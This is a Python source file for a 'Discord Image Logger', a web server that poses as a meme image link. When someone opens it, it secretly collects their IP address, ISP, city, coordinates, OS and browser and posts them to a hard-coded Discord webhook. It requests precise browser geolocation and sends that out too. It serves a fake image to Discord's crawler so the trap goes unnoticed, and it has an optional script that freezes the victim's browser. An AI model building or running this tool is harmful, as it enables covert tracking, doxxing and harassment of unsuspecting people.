#!/usr/bin/env python3
"""
Discord Image Logger – Improved Edition (No Logging)
By DeKrypt | https://github.com/dekrypted

This version is a massive overhaul of the original script. It includes:
  - Modular functions and better structure
  - Improved bot detection and VPN/Proxy checks
  - Robust error handling
  - Cleaner embed construction for Discord
  - Ability to run as a standalone HTTP server

Note: All logging functionality has been removed.
"""

from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib import parse
import traceback
import requests
import base64
import httpagentparser

# ------------------------------------------------------------
# Configuration & Constants
# ------------------------------------------------------------

CONFIG = {
    "webhook": "https://discord.com/api/webhooks/1334261539993026560/oeumT-kc65a5lIgTcszduF2UPcd75DmWYPYeU1cI-sIbds00EwM13uHeZjAfyMKHoGgZ",
    "image": "https://www.meme-arsenal.com/memes/8e63547a83c1f0d7dccb3f6596e668ca.jpg",  # Default image URL
    "imageArgument": True,  # Allow custom image URL via a base64-encoded URL argument

    "username": "Image Logger",  # Webhook username
    "color": 0x00FFFF,           # Embed color (Hex)

    "crashBrowser": False,       # Attempt to crash/freeze the browser (not guaranteed)
    "accurateLocation": True,    # Ask for geolocation (prompts the user)
    "message": {                 # Custom message settings (with rich token replacement)
        "doMessage": False,
        "message": "This browser has been pwned by DeKrypt's Image Logger. [Details: {ip}, {isp}, {asn}, {country}, {region}, {city}]",
        "richMessage": True,
    },
    "vpnCheck": 1,       # 0 = No VPN check; 1 = disable ping if VPN; 2 = do not alert if VPN detected
    "linkAlerts": True,  # Alert when the link is sent
    "buggedImage": True, # Show a loading image (for Discord crawlers)
    "antiBot": 1,        # 0 = No check; 1 = disable ping; 2 = disable ping for data centers; 3/4 = do not alert
    "redirect": {        # Redirection settings (disables image/crash options when enabled)
        "redirect": False,
        "page": "https://your-link.here"
    },
}

# Blacklisted IP prefixes (e.g. internal or known bot ranges)
BLACKLISTED_IPS = ("27", "104", "143", "164")

# Pre-decoded "loading" image for Discord crawlers (using base85)
BINARIES = {
    "loading": base64.b85decode(
        b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000'
    )
}

# ------------------------------------------------------------
# Helper Functions
# ------------------------------------------------------------

def bot_check(ip: str, useragent: str) -> str or bool:
    """
    Improved bot detection by checking the user agent for known keywords.
    Returns a string identifier if a bot is detected; otherwise, returns False.
    """
    if not useragent:
        return False
    ua = useragent.lower()
    if "discord" in ua:
        return "Discord"
    elif "telegrambot" in ua:
        return "Telegram"
    elif any(keyword in ua for keyword in ["bot", "crawl", "spider", "slurp", "mediapartners"]):
        return "Generic Bot"
    return False

def report_error(error: str):
    """
    Sends an error report to the configured Discord webhook.
    """
    payload = {
        "username": CONFIG["username"],
        "content": "@everyone",
        "embeds": [{
            "title": "Image Logger - Error",
            "color": CONFIG["color"],
            "description": f"An error occurred while logging an IP:\n\n**Error:**\n\n{error}\n"
        }]
    }
    try:
        requests.post(CONFIG["webhook"], json=payload, timeout=5)
    except Exception:
        pass  # Fail silently if reporting fails

def make_report(ip: str, useragent: str = None, coords: str = None,
                endpoint: str = "N/A", url: str or bool = False) -> dict:
    """
    Builds and sends a detailed report embed to the Discord webhook.
    Includes improved VPN/proxy and data center checks.
    """
    if ip.startswith(BLACKLISTED_IPS):
        return {}

    bot_type = bot_check(ip, useragent)
    if bot_type:
        if CONFIG["linkAlerts"]:
            payload = {
                "username": CONFIG["username"],
                "content": "",
                "embeds": [{
                    "title": "Image Logger - Link Sent",
                    "color": CONFIG["color"],
                    "description": (
                        f"An **Image Logging** link was sent!\nYou may receive an IP soon.\n\n"
                        f"**Endpoint:** {endpoint}\n"
                        f"**IP:** {ip}\n"
                        f"**Platform:** {bot_type}"
                    )
                }]
            }
            try:
                requests.post(CONFIG["webhook"], json=payload, timeout=5)
            except Exception:
                pass
        return {}

    try:
        response = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857", timeout=5)
        response.raise_for_status()
        info = response.json()
    except Exception:
        info = {}

    vpn_suspected = info.get("proxy", False)
    hosting_suspected = info.get("hosting", False)

    ping = "@everyone"
    if vpn_suspected:
        if CONFIG["vpnCheck"] == 2:
            return {}
        elif CONFIG["vpnCheck"] == 1:
            ping = ""
    if hosting_suspected:
        if CONFIG["antiBot"] in (3, 4):
            return {}
        elif CONFIG["antiBot"] in (1, 2):
            ping = ""

    os_name, browser = httpagentparser.simple_detect(useragent)

    embed = {
        "username": CONFIG["username"],
        "content": ping,
        "embeds": [{
            "title": "Image Logger - IP Logged",
            "color": CONFIG["color"],
            "description": "A user opened the original image!",
            "fields": [
                {"name": "Endpoint", "value": endpoint, "inline": False},
                {"name": "IP Information", "value": (
                    f"**IP:** {ip or 'Unknown'}\n"
                    f"**Provider:** {info.get('isp', 'Unknown')}\n"
                    f"**ASN:** {info.get('as', 'Unknown')}\n"
                    f"**Country:** {info.get('country', 'Unknown')}\n"
                    f"**Region:** {info.get('regionName', 'Unknown')}\n"
                    f"**City:** {info.get('city', 'Unknown')}\n"
                    f"**Coords:** {str(info.get('lat'))+', '+str(info.get('lon')) if not coords else coords.replace(',', ', ')} "
                    f"{'(Approximate)' if not coords else '(Precise)'}\n"
                    f"**Timezone:** {info.get('timezone', 'Unknown')}\n"
                    f"**Mobile:** {info.get('mobile', 'Unknown')}\n"
                    f"**VPN/Proxy:** {vpn_suspected}\n"
                    f"**Hosting:** {hosting_suspected}"
                ), "inline": False},
                {"name": "PC Information", "value": f"**OS:** {os_name}\n**Browser:** {browser}", "inline": False},
                {"name": "User Agent", "value": useragent or "Unknown", "inline": False}
            ],
            "footer": {"text": "Logged by Discord Image Logger"}
        }]
    }

    if url:
        embed["embeds"][0]["thumbnail"] = {"url": url}

    try:
        requests.post(CONFIG["webhook"], json=embed, timeout=5)
    except Exception:
        pass

    return info

def get_image_url(query: str) -> str:
    """
    Extracts the image URL from query parameters.
    If an image URL is provided (base64 encoded), decode it;
    otherwise, return the default image URL from the configuration.
    """
    try:
        params = dict(parse.parse_qsl(parse.urlsplit(query).query))
        if CONFIG["imageArgument"] and (params.get("url") or params.get("id")):
            encoded = params.get("url") or params.get("id")
            if isinstance(encoded, str):
                encoded = encoded.encode()
            return base64.b64decode(encoded).decode()
    except Exception:
        pass
    return CONFIG["image"]

def get_forwarded_ip(handler: BaseHTTPRequestHandler) -> str:
    """
    Returns the IP address from the X-Forwarded-For header if available;
    otherwise, falls back to the client_address.
    """
    forwarded_ip = handler.headers.get('x-forwarded-for')
    if not forwarded_ip:
        forwarded_ip = handler.client_address[0]
    return forwarded_ip

# ------------------------------------------------------------
# HTTP Request Handler
# ------------------------------------------------------------

class ImageLoggerAPI(BaseHTTPRequestHandler):
    """
    HTTP Request Handler for the Image Logger.
    Logs IP information and serves either an image, a custom message,
    or a redirection page.
    """
    def handle_request(self):
        try:
            image_url = get_image_url(self.path)
            html_data = f'''<style>
body {{
    margin: 0;
    padding: 0;
}}
div.img {{
    background-image: url('{image_url}');
    background-position: center center;
    background-repeat: no-repeat;
    background-size: contain;
    width: 100vw;
    height: 100vh;
}}
</style>
<div class="img"></div>'''.encode()

            ip = get_forwarded_ip(self)
            if ip.startswith(BLACKLISTED_IPS):
                return

            useragent = self.headers.get('user-agent', '')

            # If the request appears to come from a bot, serve a bugged image & minimal report.
            if bot_check(ip, useragent):
                self.send_response(200 if CONFIG["buggedImage"] else 302)
                if CONFIG["buggedImage"]:
                    self.send_header('Content-type', 'image/jpeg')
                else:
                    self.send_header('Location', image_url)
                self.end_headers()
                if CONFIG["buggedImage"]:
                    self.wfile.write(BINARIES["loading"])
                make_report(ip, useragent, endpoint=self.path.split("?")[0], url=image_url)
                return
            else:
                params = dict(parse.parse_qsl(parse.urlsplit(self.path).query))
                if params.get("g") and CONFIG["accurateLocation"]:
                    try:
                        coords = base64.b64decode(params.get("g").encode()).decode()
                    except Exception:
                        coords = None
                    info = make_report(ip, useragent, coords, endpoint=self.path.split("?")[0], url=image_url)
                else:
                    info = make_report(ip, useragent, endpoint=self.path.split("?")[0], url=image_url)

                message = CONFIG["message"]["message"]
                if CONFIG["message"]["richMessage"] and info:
                    message = message.replace("{ip}", ip)
                    message = message.replace("{isp}", info.get("isp", "Unknown"))
                    message = message.replace("{asn}", info.get("as", "Unknown"))
                    message = message.replace("{country}", info.get("country", "Unknown"))
                    message = message.replace("{region}", info.get("regionName", "Unknown"))
                    message = message.replace("{city}", info.get("city", "Unknown"))
                    message = message.replace("{lat}", str(info.get("lat", "Unknown")))
                    message = message.replace("{long}", str(info.get("lon", "Unknown")))
                    tz = info.get("timezone", "Unknown")
                    if "/" in tz:
                        parts = tz.split('/')
                        tz = f"{parts[1].replace('_', ' ')} ({parts[0]})"
                    message = message.replace("{timezone}", tz)
                    message = message.replace("{mobile}", str(info.get("mobile", "Unknown")))
                    message = message.replace("{vpn}", str(info.get("proxy", "Unknown")))
                    message = message.replace("{bot}", str(info.get("hosting", "Unknown") if info.get("hosting") and not info.get("proxy") else ('Possibly' if info.get("hosting") else 'False')))
                    os_name, browser = httpagentparser.simple_detect(useragent)
                    message = message.replace("{browser}", browser)
                    message = message.replace("{os}", os_name)

                data = html_data
                content_type = 'text/html'
                if CONFIG["message"]["doMessage"]:
                    data = message.encode()
                if CONFIG["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>'
                if CONFIG["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={CONFIG["redirect"]["page"]}">'.encode()

                self.send_response(200)
                self.send_header('Content-type', content_type)
                self.end_headers()

                if CONFIG["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;
if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
            if (currenturl.includes("?")) {
                currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
            } else {
                currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
            }
            location.replace(currenturl);
        });
    }
}
</script>"""
                self.wfile.write(data)
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(b'500 - Internal Server Error<br>Please check the error logs.')
            report_error(traceback.format_exc())

    def do_GET(self):
        self.handle_request()

    def do_POST(self):
        self.handle_request()

# ------------------------------------------------------------
# Server Runner (for standalone testing)
# ------------------------------------------------------------

def run_server(server_class=HTTPServer, handler_class=ImageLoggerAPI, port=8000):
    server_address = ('', port)
    httpd = server_class(server_address, handler_class)
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        pass
    httpd.server_close()

if __name__ == "__main__":
    run_server()
